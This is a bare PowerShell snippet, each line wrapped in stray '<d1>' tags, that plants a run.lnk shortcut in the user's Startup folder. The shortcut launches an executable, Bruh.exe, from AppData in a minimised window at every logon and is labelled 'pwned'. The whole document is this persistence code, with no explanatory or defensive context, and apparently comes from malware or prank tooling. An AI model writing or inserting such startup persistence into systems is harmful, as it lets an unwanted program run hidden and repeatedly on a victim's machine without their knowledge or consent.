
<d1>$ComObj = New-Object -ComObject WScript.Shell<d1>
<d1>$ShortCut = $ComObj.CreateShortcut("$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk")<d1>
<d1>$ShortCut.TargetPath = "$Env:USERPROFILE\AppData\Roaming\Bruh.exe"<d1>
<d1>$ShortCut.Description = "pwned"<d1>
<d1>$ShortCut.FullName<d1>
<d1>$ShortCut.WindowStyle = 7<d1>
<d1>$ShortCut.Save()<d1>
